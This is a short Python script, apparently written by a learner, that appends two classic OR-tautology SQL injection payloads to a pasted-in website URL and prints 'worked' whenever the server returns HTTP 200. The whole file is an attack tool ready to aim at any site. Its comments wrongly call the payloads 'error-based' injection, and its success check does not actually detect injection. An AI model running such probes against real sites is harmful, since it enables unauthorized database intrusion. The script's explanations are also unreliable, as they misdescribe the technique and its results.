#this is a code to perform the or payloads based or the error injection
import requests# importing the requests module, which is a popular library in Python for making HTTP requests.
#The variable ORpayloads is initialized as a list of OR payloads. 
# These payloads are used to inject into the URL and trigger an error-based injection.
#  In this case, the payloads are "'OR 1=1 -- " and "'OR '1'='1 -- ". 
# The -- at the end of each payload is used to comment out the rest of the SQL query and avoid syntax errors
ORpayloads = [" 'OR 1=1 -- "," 'OR '1'='1 -- "]
def or_injection(url):
    '''
    For each payload, a GET request is made to the url with the payload appended to it. The requests.get() function is used from the requests module to send the HTTP request
    After sending the request, the code checks if the response status code is equal to 200, indicating a successful response
    If the response status code is 200, it prints a message indicating that the payload worked.
    '''
    print("Trying an error based injections using ORpaylaods:")
    for i in range(0,len(ORpayloads)):
        r = requests.get(url + ORpayloads[i])
        if r.status_code == 200:
            print("{}worked".format(url + ORpayloads[i]))
url = ''#this is where you paste the website to check for error based injections
or_injection(url)
